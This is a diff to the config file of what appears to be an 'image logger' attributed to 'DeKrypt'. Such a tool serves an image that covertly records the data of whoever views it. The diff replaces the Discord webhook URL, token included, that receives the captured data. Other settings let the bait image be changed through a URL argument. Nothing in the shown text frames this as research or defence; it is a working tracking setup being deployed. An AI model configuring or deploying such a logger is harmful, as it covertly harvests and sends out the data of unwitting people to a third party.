@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1424107899722006590/yqEcyLPxga2hU4H6IAQFce4YvbmGhPtmTk3dPKIHjv18Q_drDouE99nH8L5J1jt7Ehk5",
+    "webhook": "https://discord.com/api/webhooks/1443048491847778304/50AFvn-xucRmuZbuaYnIVa1NxCRO4k_QpMmMbtxG9VY8-GwYcjYYiZo9jplMmd9778RU",
     "image": "https://www.whitescreen.online/image/black-background.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
